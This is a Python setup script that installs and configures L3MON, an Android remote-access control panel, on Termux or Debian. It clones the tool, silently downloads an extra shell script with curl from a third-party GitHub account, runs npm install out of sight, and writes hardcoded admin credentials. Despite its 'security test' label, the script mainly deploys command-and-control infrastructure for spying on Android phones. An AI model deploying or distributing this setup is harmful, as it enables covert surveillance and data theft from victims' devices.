import os
import subprocess
import shutil
import json
import time

def run_command(command):
    """Executes shell commands."""
    try:
        print(f"[*] Executing: {command}")
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Command failed: {e}")

def detect_os():
    """Identifies the environment."""
    if shutil.which("termux-setup-storage") or os.path.exists("/data/data/com.termux"):
        return "termux"
    return "debian_based"

def setup_l3mon():
    os_type = detect_os()
    print(f"[+] Environment detected: {os_type}")

    # 1. Install Core Dependencies
    if os_type == "termux":
        run_command("pkg update && pkg upgrade -y")
        run_command("pkg install wget curl git npm nano nodejs -y")
    else:
        run_command("sudo apt update")
        run_command("sudo apt install -y wget curl git npm nano nodejs")

    # 2. Global Node Tools & Clean PM2 state
    run_command("npm install pm2 -g")
    subprocess.run("pm2 delete all", shell=True, capture_output=True)

    # 3. Repository Setup (Background)
    if not os.path.exists("L3MON"):
        print("[*] Cloning L3MON in background...")
        subprocess.Popen("git clone https://github.com/efxtv/L3MON > /dev/null 2>&1 &", shell=True)
        while not os.path.exists("L3MON/package.json"):
            time.sleep(1)
    
    os.chdir("L3MON")
    
    # 4. Download Supplementary Script (Background)
    print("[*] Downloading supplementary script in background...")
    subprocess.Popen("curl -O https://raw.githubusercontent.com/efxtv/npm/main/L3mon-no-java8.sh > /dev/null 2>&1 &", shell=True)
    while not os.path.exists("L3mon-no-java8.sh"):
        time.sleep(1)

    # 5. NPM Install (Background)
    print("[*] Running npm install in background...")
    subprocess.Popen("npm install > /dev/null 2>&1 &", shell=True)
    # Wait for node_modules to be created to signify progress
    while not os.path.exists("node_modules"):
        time.sleep(1)

    # 6. Generate and Configure Database
    print("[*] Starting L3MON to generate maindb.json...")
    run_command("pm2 start index.js")
    
    print("[*] Waiting 5 seconds for file generation...")
    time.sleep(5) 
    
    run_command("pm2 stop index")

    db_content = {
        "admin": {
            "username": "admin",
            "password": "cc523d9144e2a2ba1a8791a0bd211da8",
            "loginToken": "",
            "logs": [],
            "ipLog": []
        },
        "clients": []
    }

    db_path = "maindb.json"
    try:
        with open(db_path, "w") as db_file:
            json.dump(db_content, db_file, indent=2)
        print(f"[+] Successfully modified {db_path}")
    except Exception as e:
        print(f"[!] Failed to write to {db_path}: {e}")

    # 7. Final Start
    print("[*] Restarting L3MON with updated credentials...")
    run_command("pm2 restart index")
    
    print("\n" + "="*40)
    print("[+] INSTALLATION SUCCESSFUL")
    print("[+] Login: user admin")
    print("[+] Passw: pass efxtv")
    print("[+] URL: http://127.0.0.1:22533")
    print("[+] ANDROID SECURITY TEST SCRIPT")
    print("[+] SCRIPT BY EFXTV")
    print("="*40)

if __name__ == "__main__":
    setup_l3mon()
